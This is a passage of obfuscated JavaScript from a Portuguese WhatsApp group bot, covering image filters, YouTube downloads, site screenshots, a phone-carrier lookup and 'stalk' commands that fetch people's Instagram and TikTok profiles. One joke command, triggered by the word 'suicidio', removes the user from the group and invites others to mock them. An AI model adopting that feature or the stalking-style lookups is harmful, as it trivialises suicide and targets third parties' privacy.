                  const _0x3ebf0e = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x27adc2 = await downloadContentFromMessage(_0x3ebf0e, "image");
                  let _0xf92004 = Buffer.from([]);
                  for await (const _0x385f08 of _0x27adc2) {
                    _0xf92004 = Buffer.concat([_0xf92004, _0x385f08]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x50fc77 = await upload(_0xf92004);
                  const _0x3b0a2c = "" + lolhuman;
                  const _0x3d9736 = "https://api.lolhuman.xyz/api/filter/reyes?apikey=" + _0x3b0a2c + "&img=" + _0x50fc77;
                  const _0x4e91a4 = {
                    url: _0x3d9736
                  };
                  const _0x26a34a = {
                    image: _0x4e91a4
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x26a34a);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x1a5262) {
                console.error("Erro:", _0x1a5262);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotorise":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x5ad195 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x8128bc = await downloadContentFromMessage(_0x5ad195, "image");
                  let _0x503d8e = Buffer.from([]);
                  for await (const _0x3a3283 of _0x8128bc) {
                    _0x503d8e = Buffer.concat([_0x503d8e, _0x3a3283]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x312856 = await upload(_0x503d8e);
                  const _0x532c4c = "" + lolhuman;
                  const _0x16d3a5 = "https://api.lolhuman.xyz/api/filter/rise?apikey=" + _0x532c4c + "&img=" + _0x312856;
                  const _0x1021ee = {
                    url: _0x16d3a5
                  };
                  const _0x401ec4 = {
                    image: _0x1021ee
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x401ec4);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x574769) {
                console.error("Erro:", _0x574769);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotostinson":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0xe4666a = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x4e541c = await downloadContentFromMessage(_0xe4666a, "image");
                  let _0x4141c7 = Buffer.from([]);
                  for await (const _0x3ad764 of _0x4e541c) {
                    _0x4141c7 = Buffer.concat([_0x4141c7, _0x3ad764]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x2f2434 = await upload(_0x4141c7);
                  const _0x4e837c = "" + lolhuman;
                  const _0x231325 = "https://api.lolhuman.xyz/api/filter/stinson?apikey=" + _0x4e837c + "&img=" + _0x2f2434;
                  const _0x169687 = {
                    url: _0x231325
                  };
                  const _0x4aa2fe = {
                    image: _0x169687
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x4aa2fe);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x4c8a36) {
                console.error("Erro:", _0x4c8a36);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotovalencia":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x2d1a37 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x45e603 = await downloadContentFromMessage(_0x2d1a37, "image");
                  let _0x5e4c68 = Buffer.from([]);
                  for await (const _0x27d4dd of _0x45e603) {
                    _0x5e4c68 = Buffer.concat([_0x5e4c68, _0x27d4dd]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x34859a = await upload(_0x5e4c68);
                  const _0x47e884 = "" + lolhuman;
                  const _0xb2f3e8 = "https://api.lolhuman.xyz/api/filter/valencia?apikey=" + _0x47e884 + "&img=" + _0x34859a;
                  const _0x20ea66 = {
                    url: _0xb2f3e8
                  };
                  const _0x566feb = {
                    image: _0x20ea66
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x566feb);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x256001) {
                console.error("Erro:", _0x256001);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotowalden":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x1be51e = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x245f6a = await downloadContentFromMessage(_0x1be51e, "image");
                  let _0x31d649 = Buffer.from([]);
                  for await (const _0x22d7f8 of _0x245f6a) {
                    _0x31d649 = Buffer.concat([_0x31d649, _0x22d7f8]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x473ef3 = await upload(_0x31d649);
                  const _0x1450b6 = "" + lolhuman;
                  const _0x5889e6 = "https://api.lolhuman.xyz/api/filter/walden?apikey=" + _0x1450b6 + "&img=" + _0x473ef3;
                  const _0xaf321a = {
                    url: _0x5889e6
                  };
                  const _0x1a8d8b = {
                    image: _0xaf321a
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x1a8d8b);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x1d3df6) {
                console.error("Erro:", _0x1d3df6);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotowillow":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x38cf86 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x8e3fdc = await downloadContentFromMessage(_0x38cf86, "image");
                  let _0x37f560 = Buffer.from([]);
                  for await (const _0x2d63c3 of _0x8e3fdc) {
                    _0x37f560 = Buffer.concat([_0x37f560, _0x2d63c3]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x13a18e = await upload(_0x37f560);
                  const _0x268810 = "" + lolhuman;
                  const _0x29c9f2 = "https://api.lolhuman.xyz/api/filter/willow?apikey=" + _0x268810 + "&img=" + _0x13a18e;
                  const _0x3bcbee = {
                    url: _0x29c9f2
                  };
                  const _0x14c80e = {
                    image: _0x3bcbee
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x14c80e);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x43a3e0) {
                console.error("Erro:", _0x43a3e0);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotoxpro2":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x12945e = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x23daf4 = await downloadContentFromMessage(_0x12945e, "image");
                  let _0x5ea49d = Buffer.from([]);
                  for await (const _0x330e00 of _0x23daf4) {
                    _0x5ea49d = Buffer.concat([_0x5ea49d, _0x330e00]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x5ecfa6 = await upload(_0x5ea49d);
                  const _0x2b5c85 = "" + lolhuman;
                  const _0x5a2064 = "https://api.lolhuman.xyz/api/filter/xpro2?apikey=" + _0x2b5c85 + "&img=" + _0x5ecfa6;
                  const _0x4342b7 = {
                    url: _0x5a2064
                  };
                  const _0x41b76b = {
                    image: _0x4342b7
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x41b76b);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x566649) {
                console.error("Erro:", _0x566649);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotodesenho":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x27e557 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x31819e = await downloadContentFromMessage(_0x27e557, "image");
                  let _0x3c47a1 = Buffer.from([]);
                  for await (const _0x11a43a of _0x31819e) {
                    _0x3c47a1 = Buffer.concat([_0x3c47a1, _0x11a43a]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x3e860c = await upload(_0x3c47a1);
                  const _0x1998db = "" + lolhuman;
                  const _0x18f455 = "https://api.lolhuman.xyz/api/deepfry?apikey=" + _0x1998db + "&img=" + _0x3e860c;
                  const _0x5dc7c1 = {
                    url: _0x18f455
                  };
                  const _0x7ae959 = {
                    image: _0x5dc7c1
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x7ae959);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x4d9680) {
                console.error("Erro:", _0x4d9680);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotobolha":
              try {
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x33acdc = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x1e05d1 = await downloadContentFromMessage(_0x33acdc, "image");
                  let _0x4f86f3 = Buffer.from([]);
                  for await (const _0x467ced of _0x1e05d1) {
                    _0x4f86f3 = Buffer.concat([_0x4f86f3, _0x467ced]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x513661 = await upload(_0x4f86f3);
                  const _0x188219 = "" + lolhuman;
                  const _0x52487a = "https://api.lolhuman.xyz/api/editor/roundimage?apikey=" + _0x188219 + "&img=" + _0x513661;
                  const _0x2a8d3c = {
                    url: _0x52487a
                  };
                  const _0x3b40d8 = {
                    image: _0x2a8d3c
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x3b40d8);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x38c075) {
                console.error("Erro:", _0x38c075);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "fotologo":
              try {
                if (!_0x1d6557) {
                  return _0x403602("esta faltando o texto, exemplo\nMarca  uma imagem e digita\n" + _0x1d93be + "fotologo jeff mdm");
                }
                if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                  const _0x33e271 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                  const _0x12feb5 = await downloadContentFromMessage(_0x33e271, "image");
                  let _0x3b8833 = Buffer.from([]);
                  for await (const _0x16d04 of _0x12feb5) {
                    _0x3b8833 = Buffer.concat([_0x3b8833, _0x16d04]);
                  }
                  _0x403602("Aguarde um momento...");
                  const _0x4a0739 = await upload(_0x3b8833);
                  const _0x21d6a4 = jeffcase;
                  const _0x3c161f = "https://api.lolhuman.xyz/api/welcomeimage?apikey=" + _0x21d6a4 + "&img=" + _0x4a0739 + "&text=" + _0x1d6557;
                  const _0x21479c = {
                    url: _0x3c161f
                  };
                  const _0x5ac5c8 = {
                    image: _0x21479c
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x5ac5c8);
                } else {
                  _0x403602("Selecione uma imagem para transformar.");
                }
              } catch (_0x30a55c) {
                console.error("Erro:", _0x30a55c);
                _0x403602("Ocorreu um erro ao processar a imagem.");
              }
              break;
            case "infonumero":
              if (!_0x1d6557) {
                return _0x403602("Coloque o número \nexemplo: " + (prefixo + _0x3dec88) + " 553299240466");
              }
              sexo = await fetchJson(SITE_JEFF_APIS + "/api/operadora?numero=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
              sexo2 = sexo.resultado;
              sexo3 = sexo2.operadora;
              sexo4 = sexo2.estado;
              sexo5 = sexo2.dispositivo;
              _0x403602("𝐎𝐩𝐞𝐫𝐚𝐝𝐨𝐫𝐚: " + sexo3 + "\n\n𝐄𝐬𝐭𝐚𝐝𝐨: " + sexo4 + "\n\n𝐃𝐢𝐬𝐩𝐨𝐬𝐢𝐭𝐢𝐯𝐨: " + sexo5);
              break;
            case "stalkig":
              if (!_0x1d6557) {
                return _0x403602("coloque o nome da pessoa na frente do comando");
              }
              _0x2bc3d1 = await fetchJson(SITE_JEFF_APIS + "/api/outros/stalkig?nome=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
              bct2 = _0x2bc3d1.resultado;
              bct3 = bct2.username;
              bct4 = bct2.posts;
              bct5 = bct2.followers;
              bct6 = bct2.following;
              bct7 = bct2.bio;
              bct8 = bct2.fullname;
              bct9 = bct2.photo_profile;
              const _0x4a8c86 = "\n[🔎] STALK IG [🔍]\n╔═════ °❀•°🤖°•❀°═════╗\n🔎░⃟⃛ ➮͟͞ꪶNome: " + bct3 + "\n🔎░⃟⃛ ➮͟͞ꪶFullNome: " + bct8 + "\n🔎░⃟⃛ ➮͟͞ꪶPosts: " + bct4 + "\n🔎░⃟⃛ ➮͟͞ꪶSeguidores: " + bct5 + "\n🔎░⃟⃛ ➮͞ꪶSeguindo: " + bct6 + "\n🔎░⃟⃛ ➮͟͞ꪶBio: " + bct7 + "\n╚═════ °❀•°🤖°•❀°═════╝\n";
              const _0x16f4a3 = {
                url: bct9
              };
              const _0x55f694 = {
                image: _0x16f4a3,
                caption: _0x4a8c86,
                mentions: [_0x32e455]
              };
              const _0x28b6b2 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x55f694, _0x28b6b2);
              break;
            case "infoproxy":
              if (!_0x1d6557) {
                return _0x403602("coloque o link do site pra saber o proxy exemplo:\n\n" + _0x1d93be + "infoproxy https://google.com");
              }
              _0x2bc3d1 = await fetchJson("https://api.lolhuman.xyz/api/proxysite?apikey=" + lolhuman + "&url=" + _0x1d6557);
              bct2 = _0x2bc3d1.result;
              _0x403602("⸺͟͞ꪶꪶProxy: " + bct2);
              break;
            case "stalkttk":
              if (!_0x1d6557) {
                return _0x403602("coloque o nome da pessoa a frente do comando");
              }
              stalkttk = await fetchJson("https://api.lolhuman.xyz/api/stalktiktok/" + _0x1d6557 + "?apikey=" + lolhuman);
              stalkttk2 = stalkttk.result;
              stalkttk3 = stalkttk2.username;
              stalkttk5 = stalkttk2.followers;
              stalkttk6 = stalkttk2.followings;
              stalkttk7 = stalkttk2.bio;
              stalkttk8 = stalkttk2.nickname;
              stalkttk9 = stalkttk2.likes;
              stalkttk10 = stalkttk2.video;
              _0x403602("⸺͟͞ꪶNome: " + stalkttk3 + "\n\n⸺͟͞ꪶFullNome: " + stalkttk8 + "\n\n⸺͟͞ꪶBio: " + stalkttk7 + "\n\n⸺͟͞ꪶSeguidores: " + stalkttk5 + "\n\n⸺͟͞ꪶSeguindo: " + stalkttk6 + "\n\n⸺͟͞ꪶVideos: " + stalkttk10 + "\n\n⸺͟͞ꪶLikes: " + stalkttk9);
              break;
            case "print":
            case "printsite":
              if (!_0x1d6557) {
                return _0x403602("cd o site? exemplo:\n\n" + _0x1d93be + "print https://www.google.com");
              }
              _0x403602(enviar.espere);
              _0x263319.sendMessage(_0x4f1071, {
                image: {
                  url: SITE_JEFF_APIS + "/api/screenshotweb?url=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e
                }
              });
              break;
            case "play_audio":
              try {
                if (!_0x1d6557) {
                  return _0x403602("Onde está o nome? Exemplo:\n\n" + (_0x1d93be + _0x3dec88) + " nome ou link");
                }
                const _0x5f3d02 = {
                  text: "🎶",
                  key: _0x302296.key
                };
                const _0x46cf81 = {
                  react: _0x5f3d02
                };
                _0x263319.sendMessage(_0x4f1071, _0x46cf81);
                const _0x377097 = await fetchJson(SITE_JEFF_APIS + "/api/ytsrc?q=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x5a7e2f = _0x377097.resultado;
                if (!_0x5a7e2f || _0x5a7e2f.length === 0) {
                  const _0x40beed = {
                    text: "❌",
                    key: _0x302296.key
                  };
                  const _0x8cf14d = {
                    react: _0x40beed
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x8cf14d);
                  return _0x403602("Desculpe, não consegui encontrar a música. Tente fornecer mais detalhes.");
                }
                const _0x25d8d6 = _0x5a7e2f[0];
                const _0x3cb846 = SITE_JEFF_APIS + "/api/canvas/musicardbun/music?nome=" + encodeURIComponent(_0x25d8d6.title) + "&autor=" + encodeURIComponent(_0x25d8d6.author.name) + "&tipo=space&opacity=2.0&thumb=" + encodeURIComponent(_0x25d8d6.thumbnail) + "&progresso=25&start=0:00&end=" + encodeURIComponent(_0x25d8d6.timestamp) + "&apikey=" + _0x512d5e;
                const _0x40f0d7 = ("\n      🎶 *PLAY MUSIC* 🎶\n      \n🎵 *Título:* " + F + _0x25d8d6.title + F + "\n📺 *Canal:* " + F + _0x25d8d6.author.name + F + "\n⏳ *Duração:* " + F + _0x25d8d6.timestamp + F + "\n📅 *Postado:* " + F + _0x25d8d6.ago + F + "\n👁️ *Visualizações:* " + F + _0x25d8d6.views + F + "\n🔗 *Link:* " + F + _0x25d8d6.url + F + "\n").trim();
                const _0x5ceb4d = SITE_JEFF_APIS + "/api/dl/ytaudio2?url=" + encodeURIComponent(_0x25d8d6.url) + "&apikey=" + _0x512d5e;
                const _0x58be25 = {
                  url: _0x3cb846
                };
                const _0x4400b9 = {
                  image: _0x58be25,
                  caption: _0x40f0d7
                };
                await _0x263319.sendMessage(_0x4f1071, _0x4400b9);
                const _0x5162ff = {
                  url: _0x5ceb4d
                };
                const _0x38b110 = {
                  audio: _0x5162ff,
                  mimetype: "audio/mpeg"
                };
                const _0x1fc424 = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, _0x38b110, _0x1fc424);
                const _0x1e73be = {
                  text: "✅",
                  key: _0x302296.key
                };
                const _0x50cd10 = {
                  react: _0x1e73be
                };
                _0x263319.sendMessage(_0x4f1071, _0x50cd10);
              } catch (_0x2876dd) {
                console.error(_0x2876dd);
                _0x403602("Erro ao processar sua solicitação. Tente novamente mais tarde.");
                const _0x2a0eb5 = {
                  text: "📴",
                  key: _0x302296.key
                };
                const _0x488c2e = {
                  react: _0x2a0eb5
                };
                _0x263319.sendMessage(_0x4f1071, _0x488c2e);
              }
              break;
            case "play2":
            case "play_audio2":
            case "ytmp3":
              if (!_0x1d6557) {
                return _0x403602("Onde está o nome? Exemplo:\n\n" + (_0x1d93be + _0x3dec88) + " nome ou link");
              }
              const _0x16efb7 = {
                text: "⏳",
                key: _0x302296.key
              };
              const _0x266a6b = {
                react: _0x16efb7
              };
              _0x263319.sendMessage(_0x4f1071, _0x266a6b);
              try {
                let _0x5103c9;
                if (_0x1d6557.includes("youtube.com") || _0x1d6557.includes("youtu.be")) {
                  _0x5103c9 = _0x1d6557;
                } else {
                  const _0x37c99b = await fetchJson(SITE_JEFF_APIS + "/api/ytsrc/videos?q=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                  if (_0x37c99b.resultado && _0x37c99b.resultado.length > 0) {
                    _0x5103c9 = _0x37c99b.resultado[0].url;
                  } else {
                    const _0x18eadb = {
                      text: "❌",
                      key: _0x302296.key
                    };
                    const _0x3954fa = {
                      react: _0x18eadb
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x3954fa);
                    return _0x403602("Desculpe por não conseguir encontrar a música. Por favor, forneça mais detalhes sobre ela.");
                  }
                }
                const _0x323fd0 = SITE_JEFF_APIS + "/api/dl/ytaudio2?url=" + _0x5103c9 + "&apikey=" + _0x512d5e;
                const _0x3d37ee = {
                  text: "✅",
                  key: _0x302296.key
                };
                const _0x246e6b = {
                  react: _0x3d37ee
                };
                _0x263319.sendMessage(_0x4f1071, _0x246e6b);
                const _0x2eb14f = {
                  url: _0x323fd0
                };
                const _0xd34b9e = {
                  audio: _0x2eb14f,
                  mimetype: "audio/mpeg"
                };
                const _0x5276d0 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0xd34b9e, _0x5276d0);
              } catch (_0x2fef11) {
                return _0x403602("Erro ao processar a solicitação. Tente novamente mais tarde.");
                const _0x53c95e = {
                  text: "📴",
                  key: _0x302296.key
                };
                const _0x4326f2 = {
                  react: _0x53c95e
                };
                _0x263319.sendMessage(_0x4f1071, _0x4326f2);
              }
              break;
            case "playbt":
              if (!_0x1d6557) {
                return _0x403602("Onde está o nome? Exemplo:\n\n" + (_0x1d93be + _0x3dec88) + " nome ou link");
              }
              try {
                let _0x2423ab;
                if (_0x1d6557.includes("youtube.com") || _0x1d6557.includes("youtu.be")) {
                  _0x2423ab = _0x1d6557;
                } else {
                  const _0x120ce8 = await fetchJson(SITE_JEFF_APIS + "/api/ytsrc/videos?q=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                  if (_0x120ce8.resultado && _0x120ce8.resultado.length > 0) {
                    _0x2423ab = _0x120ce8.resultado[0].url;
                  } else {
                    const _0x20df1d = {
                      text: "❌",
                      key: _0x302296.key
                    };
                    const _0x16a462 = {
                      react: _0x20df1d
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x16a462);
                    return _0x403602("Desculpe por não conseguir encontrar a música. Por favor, forneça mais detalhes sobre ela.");
                  }
                }
                const _0x55d94b = SITE_JEFF_APIS + "/api/dl/ytaudio2?url=" + _0x2423ab + "&apikey=" + _0x512d5e;
                const _0x44603c = {
                  text: "✅",
                  key: _0x302296.key
                };
                const _0x1c5847 = {
                  react: _0x44603c
                };
                _0x263319.sendMessage(_0x4f1071, _0x1c5847);
                const _0x5c1871 = {
                  url: _0x55d94b
                };
                const _0x2634db = {
                  audio: _0x5c1871,
                  mimetype: "audio/mpeg"
                };
                const _0x1627b5 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x2634db, _0x1627b5);
              } catch (_0x2a4266) {
                return _0x403602("Erro ao processar a solicitação. Tente novamente mais tarde.");
                const _0x5b3b07 = {
                  text: "📴",
                  key: _0x302296.key
                };
                const _0x2d5eb3 = {
                  react: _0x5b3b07
                };
                _0x263319.sendMessage(_0x4f1071, _0x2d5eb3);
              }
              break;
            case "play_video":
              try {
                if (!_0x1d6557) {
                  return _0x403602("Onde está o nome? Exemplo:\n\n" + (_0x1d93be + _0x3dec88) + " nome ou link");
                }
                const _0xbae802 = {
                  text: "📺",
                  key: _0x302296.key
                };
                const _0x7dff5e = {
                  react: _0xbae802
                };
                _0x263319.sendMessage(_0x4f1071, _0x7dff5e);
                const _0x344509 = await fetchJson(SITE_JEFF_APIS + "/api/ytsrc?q=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x44eda2 = _0x344509.resultado;
                if (!_0x44eda2 || _0x44eda2.length === 0) {
                  const _0x4d3ee6 = {
                    text: "❌",
                    key: _0x302296.key
                  };
                  const _0x366fa5 = {
                    react: _0x4d3ee6
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x366fa5);
                  return _0x403602("Desculpe, não consegui encontrar a música. Tente fornecer mais detalhes.");
                }
                const _0x109735 = {
                  text: "⏳",
                  key: _0x302296.key
                };
                const _0xd74deb = {
                  react: _0x109735
                };
                _0x263319.sendMessage(_0x4f1071, _0xd74deb);
                const _0x64004 = _0x44eda2[0];
                const _0x3d4c36 = SITE_JEFF_APIS + "/api/canvas/musicardbun/music?nome=" + encodeURIComponent(_0x64004.title) + "&autor=" + encodeURIComponent(_0x64004.author.name) + "&tipo=space&opacity=2.0&thumb=" + encodeURIComponent(_0x64004.thumbnail) + "&progresso=25&start=0:00&end=" + encodeURIComponent(_0x64004.timestamp) + "&apikey=" + _0x512d5e;
                const _0x50d92c = ("\n      🎶 *PLAY VIDEO* 🎶\n      \n🎵 *Título:* " + F + _0x64004.title + F + "\n📺 *Canal:* " + F + _0x64004.author.name + F + "\n⏳ *Duração:* " + F + _0x64004.timestamp + F + "\n📅 *Postado:* " + F + _0x64004.ago + F + "\n👁️ *Visualizações:* " + F + _0x64004.views + F + "\n🔗 *Link:* " + F + _0x64004.url + F + "\n").trim();
                const _0x1d331b = SITE_JEFF_APIS + "/api/dl/ytvideo2?url=" + encodeURIComponent(_0x64004.url) + "&apikey=" + _0x512d5e;
                const _0x55652c = {
                  url: _0x3d4c36
                };
                const _0x550c6e = {
                  image: _0x55652c,
                  caption: _0x50d92c
                };
                await _0x263319.sendMessage(_0x4f1071, _0x550c6e);
                const _0x430cd9 = {
                  url: _0x1d331b
                };
                const _0x35045e = {
                  video: _0x430cd9,
                  mimetype: "video/mp4"
                };
                const _0x2dc281 = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, _0x35045e, _0x2dc281);
                const _0x1e610b = {
                  text: "✅",
                  key: _0x302296.key
                };
                const _0x17e285 = {
                  react: _0x1e610b
                };
                _0x263319.sendMessage(_0x4f1071, _0x17e285);
              } catch (_0x4aa5c0) {
                console.error(_0x4aa5c0);
                _0x403602("Erro ao processar sua solicitação. Tente novamente mais tarde.");
                const _0x4d01e8 = {
                  text: "📴",
                  key: _0x302296.key
                };
                const _0xeb32df = {
                  react: _0x4d01e8
                };
                _0x263319.sendMessage(_0x4f1071, _0xeb32df);
              }
              break;
            case "play_vdbt":
              if (!_0x1d6557) {
                return _0x403602("Onde está o nome? Exemplo:\n\n" + (_0x1d93be + _0x3dec88) + " nome ou link");
              }
              try {
                let _0x101416;
                if (_0x1d6557.includes("youtube.com") || _0x1d6557.includes("youtu.be")) {
                  _0x101416 = _0x1d6557;
                } else {
                  const _0x36285b = await fetchJson(SITE_JEFF_APIS + "/api/ytsrc/videos?q=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                  if (_0x36285b.resultado && _0x36285b.resultado.length > 0) {
                    _0x101416 = _0x36285b.resultado[0].url;
                  } else {
                    const _0x1f028c = {
                      text: "❌",
                      key: _0x302296.key
                    };
                    const _0x389a68 = {
                      react: _0x1f028c
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x389a68);
                    return _0x403602("Desculpe por não conseguir encontrar a música. Por favor, forneça mais detalhes sobre ela.");
                  }
                }
                const _0x3032ee = SITE_JEFF_APIS + "/api/dl/ytvideo2?url=" + _0x101416 + "&apikey=" + _0x512d5e;
                const _0x51c817 = {
                  text: "✅",
                  key: _0x302296.key
                };
                const _0x500d68 = {
                  react: _0x51c817
                };
                _0x263319.sendMessage(_0x4f1071, _0x500d68);
                const _0x269f69 = {
                  url: _0x3032ee
                };
                const _0x1ec36a = {
                  video: _0x269f69,
                  mimetype: "video/mp4"
                };
                const _0x2c9afb = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x1ec36a, _0x2c9afb);
              } catch (_0x186287) {
                const _0x5c964c = {
                  text: "📴",
                  key: _0x302296.key
                };
                const _0x22340e = {
                  react: _0x5c964c
                };
                _0x263319.sendMessage(_0x4f1071, _0x22340e);
                return _0x403602("Deu erro talvez a api esteja off, avise o meu criador Jeff");
              }
              break;
            case "apibot":
              if (!_0x2a5ff3) {
                return;
              }
              BucetinhaRosa = await fetchJson(SITE_JEFF_APIS + "/api/keyerrada?apikey=" + _0x512d5e);
              apitxt = _0x6965b0 + " " + _0x55a6ac + "\n\n\n\n\n\n✔️ Você Tem『" + BucetinhaRosa.message.split("Limite de Request:")[1] + " 』Downloads Disponíveis...";
              _0x403602(apitxt);
              break;
            case "quando":
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("Digite a pergunta!");
              }
              const _0x39ff9a = ["Hoje", "Amanhã", "Nunca", "dia", "semana", "mês", "ano"];
              const _0x104276 = ["dias", "semanas", "meses", "anos"];
              randomm = _0x39ff9a[Math.floor(Math.random() * _0x39ff9a.length)];
              random2 = "" + (Math.floor(Math.random() * 11) + 1);
              if (randomm == "Hoje" || randomm == "Amanhã" || randomm == "Nunca") {
                _0x481435 = "Pergunta: " + _0x2e320b.slice(1) + "\nResposta: " + randomm;
              } else if (random2 == 1) {
                _0x481435 = "Pergunta: " + _0x2e320b.slice(1) + "\nResposta:  1 " + randomm;
              } else {
                random3 = _0x104276[Math.floor(Math.random() * _0x104276.length)];
                _0x481435 = "Pergunta: " + _0x2e320b.slice(1) + "\nResposta: " + random2 + " " + random3;
              }
              _0x403602(_0x481435);
              break;
            case "suicídar":
            case "suicidio":
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite\n " + _0x1d93be + "modobrincadeira 1");
              }
              if (!_0x5550bd) {
                return _0x403602("*Nao posso usar esse comando pq nao sou um adm do grupo*");
              }
              if (!_0xd20756) {
                return _0x403602("Este comando só deve ser utilizado em Grupo.");
              }
              _0x403602("💔💬 " + _0x55a6ac + " 𝗩𝗰 𝗲 𝘁𝗮̃𝗼 𝗷𝗼𝘃𝗲𝗺 𝗽𝗾 𝘃𝗮𝗶 𝗳𝗮𝘇𝗲𝗿 𝗶𝘀𝘀𝗼 💔😓😥");
              await sleep(3000);
              _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x32e455], "remove");
              await sleep(1000);
              _0x403602("*Vamo falar mal dele agora KKKK*😈");
              break;
            case "teste":
              if (!_0x23cd8e) {
